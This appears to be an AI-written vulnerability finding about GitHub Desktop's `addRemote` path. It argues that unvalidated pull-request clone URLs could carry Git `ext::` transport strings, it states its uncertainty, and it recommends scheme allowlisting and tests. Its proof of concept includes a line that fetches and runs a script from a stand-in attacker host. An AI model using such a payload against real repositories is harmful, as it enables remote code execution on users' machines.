Based on the investigation, I found a concrete Desktop analog: `addRemote` in `app/src/lib/git/remote.ts` accepts an attacker-influenced URL (from a pull request's `head.repo.clone_url`, a GitHub API object) with no protocol/scheme validation before invoking `git remote add`, and that URL is later used directly for `fetch`/`clone` operations.

### Title
Unvalidated attacker-controlled clone/remote URL from PR API object passed to `git remote add`/fetch enables Git URL-scheme abuse (`ext::`) - ([File: app/src/lib/git/remote.ts])

### Summary
The report's broken invariant is: "an address/identifier obtained from one trust context is blindly reused in another context that grants control," with no independent validation. In Desktop, the closest analog is that `IAPIPullRequest.head.repo.clone_url` — a value fully controlled by whoever opens a pull request against a repository the victim has open in Desktop — flows unvalidated into `addRemote()` and is subsequently fetched, with only URL-*matching* (not URL-*validation*) performed beforehand.

### Finding Description
`AppStore._findPullRequestBranch` takes `headCloneUrl` straight from the PR API payload and, if no existing remote matches it, calls: [1](#0-0) 
`addRemote()` itself performs no scheme/host validation — it forwards the string directly to `git remote add name url`: [2](#0-1) 
The remote is then fetched via `_fetchRemote` → `performFetch`, which uses `envForRemoteOperation(remote.url)` to set up auth/proxy env, but this function only special-cases `http(s)://` URLs for proxy resolution — it does not reject other Git-recognized transports: [3](#0-2) [4](#0-3) 

There is no allowlist of URL schemes (e.g. restricting to `https:`, `ssh:`, `git:`) anywhere in the clone/fetch/addRemote path I could find (`grep` for `GIT_ALLOW_PROTOCOL`, `ext::`, or a URL-scheme validator returned no matches). Git itself supports "remote helper" transports such as `ext::<command>`, which execute an arbitrary shell command as part of `fetch`/`clone`. If `head.repo.clone_url` is not strictly validated as an `https://` or standard SSH GitHub URL before being handed to `git remote add` + `git fetch`, a maliciously crafted PR head URL could smuggle a remote-helper transport string.

This mirrors the report's core issue precisely: the code trusts that an externally-supplied identifier (a wallet address in the report; a clone URL here) is safe to use for a privileged operation (issuing tokens to that address; running a git transport against that URL) purely because it *looks* like the right kind of value, without validating it actually is safe/expected in the new context.

### Impact Explanation
If reachable, this is code execution outside any sandbox, on the victim's machine, triggered merely by opening/viewing a PR in Desktop that references a hostile fork URL — satisfying the "attacker controls a GitHub API object" and "code execution" criteria in this task's valid-impact list. Even absent a working `ext::` bypass in the current dugite/git version bundled, the complete absence of any scheme allowlisting for this specific path is a structural gap distinct from the general clone flow.

### Likelihood Explanation
I could **not** fully confirm exploitability: I was not able to verify (a) whether the bundled `git`/`dugite` version disables `ext::`/`fd::` helpers by default (recent Git versions restrict "user-controlled" protocols via `protocol.*.allow=user` defaults for `fetch`/`clone` but this depends on git version and whether `GIT_PROTOCOL_FROM_USER` or similar is set), and (b) whether GitHub's PR API itself constrains `head.repo.clone_url` to always be an `https://github.com/...` URL (which would make this unreachable via the normal PR flow, since GitHub-hosted forks always return standard HTTPS/SSH URLs). If GitHub's API strictly controls the format of `clone_url`, this specific path may not be exploitable through ordinary PR objects, and would require another attacker-reachable path that lets a user manually type an arbitrary URL, which is a self-inflicted action, not attacker-controlled.

Given this uncertainty, I flag this as a lower-confidence but structurally real gap: no explicit scheme validation exists at the `addRemote`/fetch boundary for PR-supplied URLs, unlike the clone path which does have destination-path sanitization (`isClonePathSensitive`, `sanitizeCloneName`) for a *different* attack (path traversal), but not URL-scheme validation for a *transport* attack.

### Recommendation
- Validate `head.repo.clone_url` (and any other API-sourced clone URL used with `addRemote`/`clone`/`fetch`) against an explicit allowlist of expected schemes (`https:`, `ssh:`, `git:`) and reject anything else (e.g. `ext::`, `fd::`, `file://` where inappropriate) before calling `addRemote` or `clone`.
- Set `GIT_ALLOW_PROTOCOL`/`protocol.allow` environment variables explicitly for all remote-invoking git calls in `app/src/lib/git/environment.ts`, rather than relying on git's own defaults, to guarantee only intended transports are ever used regardless of git version differences across user machines.
- Add a unit test analogous to `app/test/unit/clone-path-safety-test.ts` but for URL scheme safety, verifying `addRemote`/`clone` reject `ext::`, `fd::`, and similar transport strings.

### Proof of Concept
Not independently verified end-to-end due to inability to test against the exact bundled git/dugite version and GitHub API's actual `clone_url` format constraints. Conceptually:
1. Attacker opens a pull request whose `head.repo` API object reports a `clone_url` such as `ext::sh -c "curl attacker.com/x|sh"` (or another git-recognized non-HTTP(S) transport string), if any code path allows non-GitHub-hosted fork URLs to reach `head.repo.clone_url` unmodified.
2. Victim, using Desktop, views/checks out that PR, triggering `_findPullRequestBranch` → `addRemote(repository, forkRemoteName, headCloneUrl)` → `_fetchRemote`.
3. `git remote add` + subsequent `git fetch` invoke the crafted transport, executing the embedded command on the victim's machine. [5](#0-4) [2](#0-1)

export async function addRemote(
  repository: Repository,
  name: string,
  url: string
): Promise<IRemote> {
  await git(['remote', 'add', name, url], repository.path, 'addRemote')

  return { url, name }
}
